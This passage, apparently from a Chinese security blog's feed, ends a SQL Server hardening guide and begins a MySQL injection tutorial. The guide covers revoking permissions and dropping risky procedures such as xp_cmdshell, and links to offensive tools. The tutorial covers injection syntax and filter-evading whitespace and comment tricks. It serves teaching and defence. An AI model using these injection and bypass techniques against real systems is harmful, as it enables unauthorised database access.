class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 服务器角色(右 键)-&gt; 新服务器角色</span><br></pre></td></tr></table></figure><p>调整角色属性中的权限，赋予角色中拥有对象对应的SELECT、INSERT、UPDATE、DELETE、EXEC、 DRI权限</p><p><img src="/images/image103.png"></p><h4 id="是否存在空密码用户"><a href="#是否存在空密码用户" class="headerlink" title="是否存在空密码用户"></a>是否存在空密码用户</h4><p>对所有账户的属性进行审计，包括空密码、密码更新时间等。修改目前所有账号的口令，确认为强口令。特别是sa账号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from sysusers</span><br><span class="line">select name,Password from syslogins where password is null order by name # 查看 口令为空的用户</span><br></pre></td></tr></table></figure><p><img src="/images/image104.png"></p><p>使用sp_password更新用户密码，特别是sa 账号，需要设置至少10位的强口令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_password &#39;old_passwd&#39;, &#39;new_passwd&#39;, sa</span><br></pre></td></tr></table></figure><h4 id="锁定特权"><a href="#锁定特权" class="headerlink" title="锁定特权"></a>锁定特权</h4><p>默认情况下，SQL Server安装会在模型数据库之外的所有数据库中授予guest帐户公共角色成员身份。 建议在Windows中禁用guest帐户，并撤消其对除master和tempdb之外的所有数据库的访问权限。参 考配置操作，使用以下命令删除数据库访问权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use msdb;</span><br><span class="line">exec sp_revokedbaccess guest;</span><br></pre></td></tr></table></figure><p><img src="/images/image105.png"></p><p>Public不应访问Web任务表，因为它们可以使表数据可供Web客户端使用。 特权应被撤销:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke update on mswebtasks to public</span><br><span class="line">revoke insert on mswebtasks to public</span><br></pre></td></tr></table></figure><p>Microsoft数据转换服务(DTS)程序包是一组COM接口，可用于在SQL Server上使用以下命令执行许 多管理任务:T-SQL，Windows脚本和可执行工具。 默认情况下，企业管理器用户可以访问可用DTS软 件包列表。过程sp_enum_ dtspackages将显示可以输入到sp_get_dtspackage中的软件包名称和ID 号，这将返回软件包数据。 然后，攻击者可能会将程序包放入他的SQL Server本地安装中，并查看程序 包详细信息，其中通常包含其他服务器的凭据。 这些程序的特权应被删除:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke execute on sp_enum_dtspackages to public</span><br><span class="line">revoke execute on sp_get_dtspackage to public</span><br></pre></td></tr></table></figure><p>sp_get_SQLAgent_properties存储过程，用于显示SQL Server代理服务连接到数据库服务器的混淆密码。使用此工具<a href="http://jimmers.narod.ru/agent_pwd.c">http://jimmers.narod.ru/agent_pwd.c</a>可以解混淆。<br>应删除此程序的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke execute on sp_get_SQLAgent_properties to public</span><br></pre></td></tr></table></figure><p>Microsoft数据转换服务(DTS)用于处理来自多个源(例如OLE DB，ODBC或文本文件)的数据。 连接密码以明文形式保存在Col11120列的表RTblDBMProps中，因此任何具有选择特权的人都可以检索 到。使用以下命令锁定此表的权限:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">revoke select on RTblDBMProps to public</span><br><span class="line">revoke update on RTblDBMProps to public</span><br><span class="line">revoke insert on RTblDBMProps to public</span><br><span class="line">revoke delete on RTblDBMProps to public</span><br></pre></td></tr></table></figure><hr><h2 id="配置日志审计"><a href="#配置日志审计" class="headerlink" title="配置日志审计"></a>配置日志审计</h2><h4 id="开启日志审计功能"><a href="#开启日志审计功能" class="headerlink" title="开启日志审计功能"></a>开启日志审计功能</h4><p>数据库应配置日志功能，对用户登录进行审计，日志内容包括用户登录使用的账号、登录是否成功、登<br>录时间等。<br>打开数据库属性，查看安全性，将服务器身份验证调整为“SQL Server 和Windows身份验证模式” ，安全 性中的登录审核调整为“失败和成功的登录”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server(右键) -&gt; 属性 -&gt; 安全性</span><br></pre></td></tr></table></figure><p><img src="/images/image106.png"></p><p>或者通过将以下注册表值设置为2（将其设置为3还将记录成功的登录）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\AuditLevel</span><br></pre></td></tr></table></figure><hr><h2 id="配置网络通信协议"><a href="#配置网络通信协议" class="headerlink" title="配置网络通信协议"></a>配置网络通信协议</h2><h4 id="禁用不必要的网络服务"><a href="#禁用不必要的网络服务" class="headerlink" title="禁用不必要的网络服务"></a>禁用不必要的网络服务</h4><p>SQL Server使用的网络通信协议应限制为最小基础架构所需。禁用SQL Server运行冗余服务。启用陌 生的网络通信协议，可能增加数据库网络风险。TCP/IP是最常用的用于SQL Server的网络协议栈，它与SSL一起为访问SQL Server提供安全的基础。<br>Microsoft SQL Server程序组, 运行服务网络实用工具。建议只使用TCP/IP协议，禁用其他协议。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议</span><br></pre></td></tr></table></figure><p><img src="/images/image107.jpeg"></p><h4 id="加固TCP-IP协议栈"><a href="#加固TCP-IP协议栈" class="headerlink" title="加固TCP/IP协议栈"></a>加固TCP/IP协议栈</h4><p>查看注册表键值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect</span><br><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect</span><br></pre></td></tr></table></figure><p>参考配置操作<br>对于TCP/IP协议栈的加固主要是某些注册表键值的修改。主要是以下几个:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting # 说明:该键值应设为2，以防御源路由欺骗攻击。 HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect #说 明:该键值应设为0，以ICMP重定向。 HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect #说明:该 键值应设为2，防御SYN FLOOD攻击。</span><br></pre></td></tr></table></figure><h4 id="使用加密通讯协议"><a href="#使用加密通讯协议" class="headerlink" title="使用加密通讯协议"></a>使用加密通讯协议</h4><p>启动SQL Server配置工具，启用”强制协议加密”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议(右键) -&gt; 属性</span><br></pre></td></tr></table></figure><p><img src="/images/image108.png"></p><hr><h2 id="删除不必要的存储过程"><a href="#删除不必要的存储过程" class="headerlink" title="删除不必要的存储过程"></a>删除不必要的存储过程</h2><p>查询已有的所有的存储过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sysobjects where xtype&#x3D;&#39;P&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image109.png"><br>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 数据库 -&gt; 系统数据库 -&gt; master(举例)-&gt; 可编程性 -&gt; 存储过程&#x2F;扩展存储过程 -&gt; 系统存储过程&#x2F;系统扩展存储过程</span><br></pre></td></tr></table></figure><p><img src="/images/image110.png"></p><p>删除SQL Server中存在的危险存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#39;xp_cmdshell&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_dirtree&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_enumgroups&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_fixeddrives&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_loginconfig&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_enumerrorlogs&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_getfiledetails&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OACreate&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OADestroy&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAGetErrorInfo&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAGetProperty&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAMethod&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OASetProperty&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAStop&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regaddmultistring&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regdeletekey&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regdeletevalue&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regenumvalues&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regread&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regremovemultistring&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regwrite&#39;</span><br><span class="line">drop procedure sp_makewebtask</span><br></pre></td></tr></table></figure><p>删除不必要的存储过程，一般情况下建议删除的存储过程有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sp_OACreate</span><br><span class="line">sp_OADestroy</span><br><span class="line">sp_OAGetErrorInfo</span><br><span class="line">sp_OAGetProperty</span><br><span class="line">sp_OAMethod</span><br><span class="line">sp_OASetProperty</span><br><span class="line">sp_OAStop</span><br><span class="line">sp_regaddmultistring</span><br><span class="line">xp_regdeletekey</span><br><span class="line">xp_regdeletevalue</span><br><span class="line">xp_regenumvalues</span><br><span class="line">xp_regremovemultistring</span><br></pre></td></tr></table></figure><p>不是应用程序必须使用时，建议删除以下存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">xp_perfend</span><br><span class="line">xp_perfmonitor</span><br><span class="line">xp_perfsample</span><br><span class="line">xp_perfstart</span><br><span class="line">xp_readerrorlog</span><br><span class="line">xp_readmail</span><br><span class="line">xp_revokelogin</span><br><span class="line">xp_runwebtask</span><br><span class="line">xp_schedulersignal</span><br><span class="line">xp_sendmail</span><br><span class="line">xp_servicecontrol</span><br><span class="line">xp_snmp_getstate</span><br><span class="line">xp_snmp_raisetrap</span><br><span class="line">xp_sprintf</span><br><span class="line">xp_sqlinventory</span><br><span class="line">xp_sqlregister</span><br><span class="line">xp_sqltrace</span><br><span class="line">xp_sscanf</span><br><span class="line">xp_startmail</span><br><span class="line">xp_stopmail</span><br><span class="line">xp_subdirs</span><br><span class="line">xp_unc_to_drive</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_sdidebug</span><br><span class="line">xp_availablemedia</span><br><span class="line">xp_cmdshell</span><br><span class="line">xp_deletemail</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_dropwebtask</span><br><span class="line">xp_dsninfo</span><br><span class="line">xp_enumdsn</span><br><span class="line">xp_enumerrorlogs</span><br><span class="line">xp_enumgroups</span><br><span class="line">xp_enumqueuedtasks</span><br><span class="line">xp_eventlog</span><br><span class="line">xp_findnextmsg</span><br><span class="line">xp_fixeddrives</span><br><span class="line">xp_getfiledetails</span><br><span class="line">xp_getnetname</span><br><span class="line">xp_grantlogin</span><br><span class="line">xp_logevent</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_logininfo</span><br><span class="line">xp_makewebtask</span><br><span class="line">xp_msver</span><br></pre></td></tr></table></figure><hr><h2 id="删除不必要的功能和服务"><a href="#删除不必要的功能和服务" class="headerlink" title="删除不必要的功能和服务"></a>删除不必要的功能和服务</h2><p>SQL Server的远程访问功能，允许网络上的其他SQL Server远程连接并执行存储过程。如果不需要此功能，则应使用以下命令禁用该功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute sp_configure &#39;remote access&#39;, &#39;0&#39;</span><br><span class="line">go</span><br><span class="line">reconfigure with override</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>或者使用Microsoft SQL Server Management Studio</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server(右键) -&gt; 属性 -&gt; 连接</span><br></pre></td></tr></table></figure><p><img src="/images/image112.png"></p><p>配置选项“允许更新”定义数据库用户是否可以直接更新系统表。这对于高级管理员来说可能是有用的临时功能，但对于正常操作，应该将其禁用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute sp_configure &#39;allow updates&#39;, &#39;0&#39;</span><br><span class="line">go</span><br><span class="line">reconfigure with override</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>SQL Server Monitor，它侦听UDP端口1434并提供客户端不应访问有关服务器上存在的实例的信息，并且SQL Server将在其被阻止的情况下运行。防火墙或应阻止来自TCP端口1433和UDP端口1434的外部 通信。异构查询或临时查询允许数据库用户使用本地数据在远程服务器上执行查询。该功能可能被滥用以强制使用远程或本地访问凭据，应在不需要此功能时，将其禁用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite N&#39;HKEY_LOCAL_MACHINE&#39;,</span><br><span class="line">N&#39;SOFTWARE\Microsoft\MSSQLServer\Providers\SQLOLEDB&#39;, N&#39;DisallowAdhocAccess&#39;,</span><br><span class="line">N&#39;REG_DWORD&#39;, 1</span><br></pre></td></tr></table></figure><p>如果不需要，则应禁用SQL Server代理，Microsoft分布式事务处理协调器(MSDTC)和MSSearch服务。可以使用企业管理器或通过在Windows Services管理工具中将其启动类型设置为“停止”来关闭服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 管理</span><br></pre></td></tr></table></figure><p><img src="/images/image113.png"></p><p>或者设置注册表值禁用服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_set_sqlagent_properties @auto_start&#x3D;0</span><br><span class="line">exec xp_regwrite N&#39;HKEY_LOCAL_MACHINE&#39;,</span><br><span class="line">N&#39;SYSTEM\CurrentControlSet\Services\MSDTC&#39;, N&#39;Start&#39;, N&#39;REG_DWORD&#39;, 3</span><br><span class="line">exec xp_regwrite N&#39;HKEY_LOCAL_MACHINE&#39;,</span><br><span class="line">N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;, N&#39;Start&#39;, N&#39;REG_DWORD&#39;, 3</span><br></pre></td></tr></table></figure><p>进行这些更改后，应手动停止服务或重新启动服务器。</p><hr><h2 id="安装补丁"><a href="#安装补丁" class="headerlink" title="安装补丁"></a>安装补丁</h2><p>最后的步骤是确保应用最新的服务包和补丁程序。将显示SQL Server的当前版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version</span><br></pre></td></tr></table></figure><p><img src="/images/image114.png"></p><hr><h2 id="实战工具"><a href="#实战工具" class="headerlink" title="实战工具"></a>实战工具</h2><p><a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a></p><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg">https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg</a></p><p><a href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></p><p><a href="http://www.freetds.org/">http://www.freetds.org/</a></p><p><a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></p><p><a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></p><p><a href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></p><p><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><p><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></p><p><a href="https://h4ms1k.github.io/Red_Team_MSSQL_Server/#">https://h4ms1k.github.io/Red_Team_MSSQL_Server/#</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/154">https://security.tencent.com/index.php/blog/msg/154</a></p><p><a href="https://www.freebuf.com/articles/es/262903.html">https://www.freebuf.com/articles/es/262903.html</a></p><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8</a></p><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> </p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> </p><p><a href="https://github.com/nccgroup/nccfsas">https://github.com/nccgroup/nccfsas</a></p>]]></content>
      
      
      <categories>
          
          <category> SQL Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SQL Server </tag>
            
            <tag> 攻防演练 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全-Mysql注入</title>
      <link href="2021/04/20/Web%E5%AE%89%E5%85%A8-Mysql%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/20/Web%E5%AE%89%E5%85%A8-Mysql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h1><h2 id="Sql-注入介绍"><a href="#Sql-注入介绍" class="headerlink" title="Sql 注入介绍"></a>Sql 注入介绍</h2><p>sql注入就是指Web应用程序在对用户输入的数据未进行合法性的判断，并且前端传入后端的参数是攻击者可控的，并且参数可以带入数据库进行执行。攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p><h2 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h2><p>MySQL 是一款安全、跨平台、高效的，并与 PHP、Java 等主流编程语言紧密结合的数据库系统。该数据库系统是由瑞典的 MySQL AB 公司开发、发布并支持，由 MySQL 的初始开发人员 David Axmark 和 Michael Monty Widenius 于 1995 年建立的。目前 MySQL 被广泛地应用在 Internet 上的中小型网站中。由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，使得很多公司都采用 MySQL 数据库以降低成本。MySQL 数据库可以称得上是目前运行速度最快的 SQL 语言数据库之一。除了具有许多其他数据库所不具备的功能外，MySQL 数据库还是一种完全免费的产品，用户可以直接通过网络下载 MySQL 数据库，而不必支付任何费用。</p><h2 id="MySQL-基础知识"><a href="#MySQL-基础知识" class="headerlink" title="MySQL 基础知识"></a>MySQL 基础知识</h2><ul><li>字符串截取函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left(str,index)  &#x2F;&#x2F;从左边第index开始截取</span><br><span class="line">right(str,index) &#x2F;&#x2F;从右边第index开始截取</span><br><span class="line">substring(str,index) &#x2F;&#x2F;从左边index开始截取</span><br><span class="line">substr(str,index,len) &#x2F;&#x2F;截取str,index开始,截取len的长度</span><br><span class="line">mid(str,index,ken) &#x2F;&#x2F;截取str 从index开始,截取len的长度</span><br></pre></td></tr></table></figure><ul><li>字符串比较</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) &#x2F;&#x2F;如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br><span class="line">find_in_set(str,strlist) &#x2F;&#x2F;如果相同则返回1不同则返回0</span><br></pre></td></tr></table></figure><ul><li>字符串连接函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2) &#x2F;&#x2F;将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2) &#x2F;&#x2F;将字符串用指定连接符连接</span><br><span class="line">group_concat()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><ul><li>一些绕过注入的罕见函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) &#x2F;&#x2F;从子字符串中返回子串第一次出现的位置</span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) &#x2F;&#x2F; 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure><ul><li><p>运算符</p><ul><li>算术运算符: <code> + - * /   </code></li><li>比较运算符: <code>= &lt;&gt; != &gt; &lt;   </code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)between &#x2F;&#x2F;select database() between 0x61 and 0x7a; &#x2F;&#x2F;select database() between &#39;a&#39; and &#39;z&#39;;</span><br><span class="line">(2)in &#x2F;&#x2F;select &#39;123&#39; in (&#39;12&#39;) &#x3D;&gt; 0</span><br><span class="line">(3)like(模糊匹配) &#x2F;&#x2F;select &#39;12345&#39; like &#39;12%&#39; &#x3D;&gt; true</span><br><span class="line">(4)regexp 或 rlike(正则匹配)&#x2F;&#x2F;select &#39;123455&#39; regexp &#39;^12&#39; &#x3D;&gt; true</span><br></pre></td></tr></table></figure></li><li>逻辑运算符: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 &#x3D;&#x3D; &amp;&amp;</span><br><span class="line">OR 逻辑或 &#x3D;&#x3D; ||</span><br><span class="line">XOR 逻辑异或 &#x3D;&#x3D; ^</span><br></pre></td></tr></table></figure></li><li>位运算符:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure></li><li>注释符:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;&#x2F;单行注释符,url记得编码为%23</span><br><span class="line">&#x2F;**&#x2F; </span><br><span class="line">--+</span><br></pre></td></tr></table></figure></li></ul></li><li><p>常用函数</p><ul><li>延时函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br></pre></td></tr></table></figure></li><li>编码函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex() ascii()</span><br></pre></td></tr></table></figure></li><li>文件函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.load_file  &#x2F;&#x2F;读取文件</span><br><span class="line">2.outfile &#x2F;&#x2F;写入文件</span><br></pre></td></tr></table></figure></li></ul></li><li><p>一些构造语句的知识</p><ul><li>条件语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3) &#x2F;&#x2F; expr1 true执行expr2否则执行expr3</span><br><span class="line">select case when (条件) then 代码1 else 代码 2 end</span><br></pre></td></tr></table></figure></li><li>information_schema 结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables:</span><br><span class="line">查询表名:table_name  对应的数据库名: table_schema</span><br><span class="line">information_schema.columns:</span><br><span class="line">查询列名:column_name 对应的表名:table_schemamysql盲注语句一般形式</span><br><span class="line">查询结果 + 比较运算符 + 猜测值</span><br></pre></td></tr></table></figure></li><li>mysql 报错注入：构造报错语句 + 查询结果</li><li> mysql 联合注入：构造联合语句 + 查询结果</li><li>mysql 盲注：查询结果 + 比较运算符 + 猜测值</li><li>mysql空白字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释</span><br><span class="line"> # 这个也可以用来做分隔 挺有意思</span><br></pre></td></tr></table></figure></li><li>tips:</li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">函数名和括号直接可以插入特殊字符 ex</span><br><span class="line"></span><br><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br><span class="line"></span><br><span 